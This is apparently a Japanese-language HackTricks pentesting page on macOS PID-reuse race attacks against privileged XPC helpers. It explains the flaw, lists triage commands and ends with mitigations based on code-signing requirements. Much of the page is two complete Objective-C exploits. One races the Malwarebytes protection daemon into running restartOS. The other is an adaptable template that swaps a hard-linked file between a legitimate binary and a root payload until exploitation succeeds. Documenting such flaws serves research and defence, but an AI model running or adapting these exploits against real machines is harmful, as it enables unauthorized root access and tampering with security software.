# macOS PID Reuse

{{#include ../../../../../../banners/hacktricks-training.md}}

## PID Reuse

macOS の **XPC service** が、受信した message に紐付いた credentials を使わず、**PID** を解決することで caller を認証している場合、PID reuse attack に対して脆弱な可能性があります。実際に必要となる primitive は、PID namespace が wrap するまで待つことではありません。attacker は XPC request を送信した直後に **`posix_spawn(NULL, target_binary, NULL, &attr, target_argv, environ)`** を `POSIX_SPAWN_SETEXEC` とともに呼び出し、**PID を保持したまま、attacker の process image を許可された binary に置き換えます**。<sup>[[1]](#references)[[2]](#references)</sup>

server が request を dequeue してから、その numeric PID を live process に解決し、code-signing、entitlement、path、または parent-process のチェックを行う場合、message を送信した process ではなく、置き換え後の binary を認識します。`POSIX_SPAWN_START_SUSPENDED` により、server がチェックを実行している間、信頼された replacement を存続させ、安定した状態に保てます。<sup>[[1]](#references)[[2]](#references)</sup>

### What is actually raced

脆弱な sequence は、単に「PIDs can repeat」というものではなく、**message-identity TOCTOU** です:<sup>[[1]](#references)[[2]](#references)</sup>

1. attacker process が XPC connection を確立または resume し、privileged request を queue に入れます。
2. service が connection の PID を `SecCodeRef` または別の process object に変換する前に、attacker は `POSIX_SPAWN_SETEXEC` を使用して、同じ process を approved executable で overlay します。
3. service は、その PID に現在紐付いている approved image を検証し、その後、すでに queue に入っている attacker-controlled request を dispatch します。

authorization data flow 内にある PID bridge はすべて suspicious です。例として、`-[NSXPCConnection processIdentifier]`、`xpc_connection_get_pid`、または `audit_token_to_pid` の後に `SecCodeCopyGuestWithAttributes`/`kSecGuestAttributePid`、`proc_pidpath`、`NSRunningApplication(processIdentifier:)`、または custom signature verifier が続くものがあります。PID が logging のみに使用されているだけでは不十分です。それが allow/deny decision に到達することを確認してください。また、error path も確認してください。最初に audit-token lookup を試みても、**失敗時に PID に fallback する**場合、同じ race が再び発生します。この fallback pattern は、Intego の privileged XPC services に関する 2026 年の analysis で確認されています。<sup>[[3]](#references)</sup>

### Fast static and dynamic triage

connection handler から調査を開始し、各 PID-producing call を code-signing、entitlement、executable-path、または version check へ trace します。これらの commands により、candidate helper をすばやく first pass できます。stripped binaries でも、imported symbols、Objective-C selectors、または diagnostic strings が残っていることは一般的です:<sup>[[3]](#references)[[4]](#references)[[5]](#references)</sup>
```bash
BIN="/path/to/privileged/helper"
nm -um "$BIN" 2>/dev/null | rg 'xpc_connection_get_pid|SecCodeCopyGuestWithAttributes'
otool -ov "$BIN" 2>/dev/null | rg 'processIdentifier|auditToken|setCodeSigningRequirement'
strings -a "$BIN" | rg -i 'guest.*pid|signature.*pid|process identifier|audit token|peer.*requirement'
```
制御されたテストでは、PIDのソースとその検証処理の両方をbreakまたはhookします。`xpc_connection_get_pid`または`-processIdentifier`へのヒットは手がかりにすぎません。有用な証拠は、リクエストの受信後に**同じ整数**を後続のlookupで使用していることです。Fridaでは、アプリケーション固有の検証処理とprivileged selectorを追加でhookし、PID raceに勝ったときにselectorが実行されるかどうかを測定できます。<sup>[[3]](#references)</sup>

### Exploitの例

**`shouldAcceptNewConnection`**、またはそれから呼び出される関数で、**`processIdentifier`**を**呼び出して**おり、**`auditToken`**を呼び出していない関数を見つけた場合、それは**audit tokenではなくプロセスPIDを検証している**可能性が非常に高いです。\
例えば、次の画像のような場合です（referenceから取得）：<sup>[[1]](#references)</sup>

<figure><img src="../../../../../../images/image (306).png" alt="https://wojciechregula.blog/images/2020/04/pid.png"><figcaption></figcaption></figure>

次のexploitの例（こちらもreferenceから取得）を確認し、exploitの2つの部分を見てください：<sup>[[1]](#references)</sup>

- **複数のforkを生成**するもの
- **各fork**がXPC serviceに**payloadを送信**し、その直後に**`posix_spawn`**を実行するもの

> [!CAUTION]
> Objective-Cプロセスから`fork()`とのraceを行う場合は、`OBJC_DISABLE_INITIALIZE_FORK_SAFETY=YES`をexportしてexploitを起動するか、`__objc_fork_ok` markerを埋め込んでください：
>
> ```objectivec
> asm(".section __DATA,__objc_fork_ok\n"
> "empty:\n"
> ".no_dead_strip empty\n");
> ```

{{#tabs}}
{{#tab name="NSTasks"}}
**NSTasks**と、childrenを起動してRCをexploitするための引数を使用する最初のオプション
```objectivec
// Code from https://wojciechregula.blog/post/learn-xpc-exploitation-part-2-say-no-to-the-pid/
// gcc -framework Foundation expl.m -o expl

#import <Foundation/Foundation.h>
#include <spawn.h>
#include <sys/stat.h>

#define RACE_COUNT 32
#define MACH_SERVICE @"com.malwarebytes.mbam.rtprotection.daemon"
#define BINARY "/Library/Application Support/Malwarebytes/MBAM/Engine.bundle/Contents/PlugIns/RTProtectionDaemon.app/Contents/MacOS/RTProtectionDaemon"

// allow fork() between exec()
asm(".section __DATA,__objc_fork_ok\n"
"empty:\n"
".no_dead_strip empty\n");

extern char **environ;

// defining necessary protocols
@protocol ProtectionService
- (void)startDatabaseUpdate;
- (void)restoreApplicationLauncherWithCompletion:(void (^)(BOOL))arg1;
- (void)uninstallProduct;
- (void)installProductUpdate;
- (void)startProductUpdateWith:(NSUUID *)arg1 forceInstall:(BOOL)arg2;
- (void)buildPurchaseSiteURLWithCompletion:(void (^)(long long, NSString *))arg1;
- (void)triggerLicenseRelatedChecks;
- (void)buildRenewalLinkWith:(NSUUID *)arg1 completion:(void (^)(long long, NSString *))arg2;
- (void)cancelTrialWith:(NSUUID *)arg1 completion:(void (^)(long long))arg2;
- (void)startTrialWith:(NSUUID *)arg1 completion:(void (^)(long long))arg2;
- (void)unredeemLicenseKeyWith:(NSUUID *)arg1 completion:(void (^)(long long))arg2;
- (void)applyLicenseWith:(NSUUID *)arg1 key:(NSString *)arg2 completion:(void (^)(long long))arg3;
- (void)controlProtectionWithRawFeatures:(long long)arg1 rawOperation:(long long)arg2;
- (void)restartOS;
- (void)resumeScanJob;
- (void)pauseScanJob;
- (void)stopScanJob;
- (void)startScanJob;
- (void)disposeOperationBy:(NSUUID *)arg1;
- (void)subscribeTo:(long long)arg1;
- (void)pingWithTag:(NSUUID *)arg1 completion:(void (^)(NSUUID *, long long))arg2;
@end

void child() {

// send the XPC messages
NSXPCInterface *remoteInterface = [NSXPCInterface interfaceWithProtocol:@protocol(ProtectionService)];
NSXPCConnection *xpcConnection = [[NSXPCConnection alloc] initWithMachServiceName:MACH_SERVICE options:NSXPCConnectionPrivileged];
xpcConnection.remoteObjectInterface = remoteInterface;

[xpcConnection resume];
[xpcConnection.remoteObjectProxy restartOS];

char target_binary[] = BINARY;
char *target_argv[] = {target_binary, NULL};
posix_spawnattr_t attr;
posix_spawnattr_init(&attr);
short flags;
posix_spawnattr_getflags(&attr, &flags);
flags |= (POSIX_SPAWN_SETEXEC | POSIX_SPAWN_START_SUSPENDED);
posix_spawnattr_setflags(&attr, flags);
posix_spawn(NULL, target_binary, NULL, &attr, target_argv, environ);
}

bool create_nstasks() {

NSString *exec = [[NSBundle mainBundle] executablePath];
NSTask *processes[RACE_COUNT];

for (int i = 0; i < RACE_COUNT; i++) {
processes[i] = [NSTask launchedTaskWithLaunchPath:exec arguments:@[ @"imanstask" ]];
}

int i = 0;
struct timespec ts = {
.tv_sec = 0,
.tv_nsec = 500 * 1000000,
};

nanosleep(&ts, NULL);
if (++i > 4) {
for (int i = 0; i < RACE_COUNT; i++) {
[processes[i] terminate];
}
return false;
}

return true;
}

int main(int argc, const char * argv[]) {

if(argc > 1) {
// called from the NSTasks
child();

} else {
NSLog(@"Starting the race");
create_nstasks();
}

return 0;
}
```
{{#endtab}}

{{#tab name="fork"}}
この例では、raw **`fork`** を使用して、**PID race conditionを悪用する子プロセス**を起動し、その後、Hard linkを介して**別のrace condition**を悪用します：
```objectivec
// export OBJC_DISABLE_INITIALIZE_FORK_SAFETY=YES
// gcc -framework Foundation expl.m -o expl

#include <Foundation/Foundation.h>
#include <spawn.h>
#include <pthread.h>

// TODO: CHANGE PROTOCOL AND FUNCTIONS
@protocol HelperProtocol
- (void)DoSomething:(void (^)(_Bool))arg1;
@end

// Global flag to track exploitation status
bool pwned = false;

/**
* Continuously overwrite the contents of the 'hard_link' file in a race condition to make the
* XPC service verify the legit binary and then execute as root out payload.
*/
void *check_race(void *arg) {
while(!pwned) {
// Overwrite with contents of the legit binary
system("cat ./legit_bin > hard_link");
usleep(50000);

// Overwrite with contents of the payload to execute
// TODO: COMPILE YOUR OWN PAYLOAD BIN
system("cat ./payload > hard_link");
usleep(50000);
}
return NULL;
}

void child_xpc_pid_rc_abuse(){
// TODO: INDICATE A VALID BIN TO BYPASS SIGN VERIFICATION
#define kValid "./Legit Updater.app/Contents/MacOS/Legit"
extern char **environ;

// Connect with XPC service
// TODO: CHANGE THE ID OF THE XPC TO EXPLOIT
NSString*  service_name = @"com.example.Helper";
NSXPCConnection* connection = [[NSXPCConnection alloc] initWithMachServiceName:service_name options:0x1000];
// TODO: CNAGE THE PROTOCOL NAME
NSXPCInterface* interface = [NSXPCInterface interfaceWithProtocol:@protocol(HelperProtocol)];
[connection setRemoteObjectInterface:interface];
[connection resume];

id obj = [connection remoteObjectProxyWithErrorHandler:^(NSError* error) {
NSLog(@"[-] Something went wrong");
NSLog(@"[-] Error: %@", error);
}];

NSLog(@"obj: %@", obj);
NSLog(@"conn: %@", connection);

// Call vulenrable XPC function
// TODO: CHANGE NAME OF FUNCTION TO CALL
[obj DoSomething:^(_Bool b){
NSLog(@"Response, %hdd", b);
}];

// Change current process to the legit binary suspended
char target_binary[] = kValid;
char *target_argv[] = {target_binary, NULL};
posix_spawnattr_t attr;
posix_spawnattr_init(&attr);
short flags;
posix_spawnattr_getflags(&attr, &flags);
flags |= (POSIX_SPAWN_SETEXEC | POSIX_SPAWN_START_SUSPENDED);
posix_spawnattr_setflags(&attr, flags);
posix_spawn(NULL, target_binary, NULL, &attr, target_argv, environ);
}

/**
* Function to perform the PID race condition using children calling the XPC exploit.
*/
void xpc_pid_rc_abuse() {
#define RACE_COUNT 1
extern char **environ;
int pids[RACE_COUNT];

// Fork child processes to exploit
for (int i = 0; i < RACE_COUNT; i++) {
int pid = fork();
if (pid == 0) {  // If a child process
child_xpc_pid_rc_abuse();
}
printf("forked %d\n", pid);
pids[i] = pid;
}

// Wait for children to finish their tasks
sleep(3);

// Terminate child processes
for (int i = 0; i < RACE_COUNT; i++) {
if (pids[i]) {
kill(pids[i], 9);
}
}
}

int main(int argc, const char * argv[]) {
// Create and set execution rights to 'hard_link' file
system("touch hard_link");
system("chmod +x hard_link");

// Create thread to exploit sign verification RC
pthread_t thread;
pthread_create(&thread, NULL, check_race, NULL);

while(!pwned) {
// Try creating 'download' directory, ignore errors
system("mkdir download 2>/dev/null");

// Create a hardlink
// TODO: CHANGE NAME OF FILE FOR SIGN VERIF RC
system("ln hard_link download/legit_bin");

xpc_pid_rc_abuse();
usleep(10000);

// The payload will generate this file if exploitation is successful
if (access("/tmp/pwned", F_OK ) == 0) {
pwned = true;
}
}

return 0;
}
```
{{#endtab}}
{{#endtabs}}

## raceを再現可能にする

以下の調整ポイントは、成功するPID reuse exploitおよび最近のprivileged-helper testingで繰り返し確認されています:<sup>[[1]](#references)[[3]](#references)</sup>

- リクエストを送信したら、すぐに `posix_spawn` を呼び出します。replyを待ってはいけません。image replacement後にserverのPID lookupが実行される間、リクエストはすでにqueueに入っている必要があります。
- `POSIX_SPAWN_SETEXEC | POSIX_SPAWN_START_SUSPENDED` を組み合わせて使用します。前者のflagはrace中のprocessのPIDを維持し、後者はvalidation前に正しいtargetが終了またはstate変更するのを防ぎます。
- 短時間だけ存在する複数のracerを使用し、connection/request/exec sequence全体をretryします。最適な数はtargetによって異なります。childrenを増やしすぎるとserviceが遅くなり、windowが悪化する可能性があります。
- replacementはserverの**すべての**要件を満たす必要があります。可能な場合は正規のclient binaryを再利用し、まず `codesign -d -r- "/path/to/client.app"` でそのdesignated requirementを確認します。
- 最初に、害のないexported selectorまたはread-only methodを呼び出します。これにより、authenticationに成功したことと、後続のprivileged primitiveのexploitに成功したことを切り分けられます。

## PID bridgeを回避する

macOS 13以降では、Foundationが `-[NSXPCConnection setCodeSigningRequirement:]` を公開しています。peer requirementは一度だけ、かつ `resume` の**前に**設定してください。不正なrequirement stringはexception（またはSwiftのfatal error）を発生させ、requirementを満たさないpeerからのmessageはconnectionを無効にします。これにより、application codeがPIDを解決しなくても、XPCによってpeerのcode identityを強制できます。<sup>[[6]](#references)</sup>
```objectivec
- (BOOL)listener:(NSXPCListener *)l shouldAcceptNewConnection:(NSXPCConnection *)c {
@try {
NSString *req = @"anchor apple generic and identifier \"com.example.client\" "
@"and certificate leaf[subject.OU] = \"TEAMID\"";
[c setCodeSigningRequirement:req];
} @catch (NSException *e) {
return NO;
}
c.exportedInterface = [NSXPCInterface interfaceWithProtocol:@protocol(Helper)];
c.exportedObject = self;
[c resume];
return YES;
}
```
macOS 26+ の modern low-level listener API では、`xpc_listener_set_peer_requirement` により、listener が inactive の間に検証済みの `xpc_peer_requirement_t` を適用できます。XPC はこの要件を満たさないリクエストを破棄します。listener から作成された peer session はこの要件を継承**しない**ため、それらの session が privileged operations を認可する場合は、適切な session requirement も適用してください。<sup>[[7]](#references)</sup>

> [!WARNING]
> audit token をコピーしてから、実際の `SecCode` lookup のために PID に変換し直すことで、これを「修正」しようとしてはいけません。認可判断まで audit token から導出した identity を保持するか、XPC peer-requirement API を end to end で使用してください。<sup>[[2]](#references)[[6]](#references)</sup> connection-wide audit-token API には別種の race class もあり、[macOS xpc_connection_get_audit_token Attack](macos-xpc_connection_get_audit_token-attack.md) で説明しています。

## その他の例

- [**Intego X9: macOS antivirus が PID を信頼すべきでない理由**](https://blog.quarkslab.com/intego_lpe_macos_2.html) - クライアントを PID で認証していた AV の privileged helper に対する LPE。<sup>[[3]](#references)</sup>
- [**macOS で GOG Galaxy XPC service を悪用して privilege escalation を実行する**](https://www.ibm.com/think/x-force/exploiting-gog-galaxy-xpc-service-privilege-escalation-macos)<sup>[[4]](#references)</sup>
- [**Rootpipe Reborn (Part II)**](https://objective-see.org/blog/blog_0x41.html)<sup>[[5]](#references)</sup>



## References

- [1] [XPC exploitation を学ぶ - Part 2: PID に No と言おう！](https://wojciechregula.blog/post/learn-xpc-exploitation-part-2-say-no-to-the-pid/)
- [2] [PID を信頼するな！単純な logic bug の事例とその発見場所 - Samuel Groß (WarCon 2018)](https://saelo.github.io/presentations/warcon18_dont_trust_the_pid.pdf)
- [3] [Intego X9: macOS antivirus が PID を信頼すべきでない理由](https://blog.quarkslab.com/intego_lpe_macos_2.html)
- [4] [macOS で GOG Galaxy XPC service を悪用して privilege escalation を実行する](https://www.ibm.com/think/x-force/exploiting-gog-galaxy-xpc-service-privilege-escalation-macos)
- [5] [Rootpipe Reborn (Part II)](https://objective-see.org/blog/blog_0x41.html)
- [6] [Apple Developer — `NSXPCConnection.setCodeSigningRequirement`](https://developer.apple.com/documentation/foundation/nsxpcconnection/setcodesigningrequirement(_:))
- [7] [Apple Developer — `xpc_listener_set_peer_requirement`](https://developer.apple.com/documentation/xpc/xpc_listener_set_peer_requirement)
{{#include ../../../../../../banners/hacktricks-training.md}}
